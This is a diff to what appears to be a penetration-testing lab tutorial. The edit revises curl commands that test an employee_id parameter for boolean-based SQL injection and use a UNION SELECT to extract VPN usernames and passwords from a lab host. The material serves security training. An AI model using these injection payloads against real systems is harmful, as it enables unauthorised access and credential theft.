@@ -148,20 +148,32 @@ The page has two potential injection points:
 Let's test the `employee_id` parameter - it's a numeric field which is often easier to exploit:
 
 ```bash
-# Normal request - shows "Employee Details" section
-curl -s "http://172.16.0.100/employees/?employee_id=1" | grep -o "Employee Details"
-
-# Test with a simple boolean injection (true condition - should show details)
-curl -s "http://172.16.0.100/employees/?employee_id=1 AND 1=1" | grep -o "Employee Details"
-
-# This should return nothing (false condition - no details shown)
-curl -s "http://172.16.0.100/employees/?employee_id=1 AND 1=2" | grep -o "Employee Details"
+# Normal request - should show employee notes
+curl -s "http://172.16.0.100/employees/?employee_id=1" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
 ```
 
+**Expected output:** `IT admin, has server access`
+
+Now test with boolean SQL injection:
+
+```bash
+# Boolean true (1=1) - should still show notes (spaces URL-encoded as %20)
+curl -s "http://172.16.0.100/employees/?employee_id=1%20AND%201=1" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
+```
+
+**Expected output:** `IT admin, has server access` (same as before)
+
+```bash
+# Boolean false (1=2) - should return NOTHING
+curl -s "http://172.16.0.100/employees/?employee_id=1%20AND%201=2" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
+```
+
+**Expected output:** (empty - no output!)
+
 **Understanding the attack:**
-- The query becomes: `WHERE id = 1 AND 1=1` (true - returns employee details)
-- vs: `WHERE id = 1 AND 1=2` (false - no details section appears)
-- Different responses confirm SQL injection vulnerability!
+- `WHERE id = 1 AND 1=1` (true) → returns the employee row → shows notes
+- `WHERE id = 1 AND 1=2` (false) → returns no rows → no notes section
+- **Different responses confirm SQL injection!** The injected SQL is being executed.
 
 ### 2.5 Extracting Data with SQLMap
 
@@ -546,10 +558,11 @@ you could also use svc_backup's DCSync rights to extract password hashes.
 Instead of using sqlmap, try to extract data manually using UNION-based injection:
 ```bash
 # Find the number of columns (try increasing until no error)
-curl "http://172.16.0.100/employees/?employee_id=1 ORDER BY 10-- -"
+# Spaces must be URL-encoded as %20
+curl "http://172.16.0.100/employees/?employee_id=1%20ORDER%20BY%2010--%20-"
 
 # Extract data with UNION
-curl "http://172.16.0.100/employees/?employee_id=-1 UNION SELECT 1,2,3,vpn_username,vpn_password,6,7,8,9,10 FROM wp_acme_employees-- -"
+curl "http://172.16.0.100/employees/?employee_id=-1%20UNION%20SELECT%201,2,3,vpn_username,vpn_password,6,7,8,9,10%20FROM%20wp_acme_employees--%20-"
 ```
 
 ### Exercise 2: Password Cracking
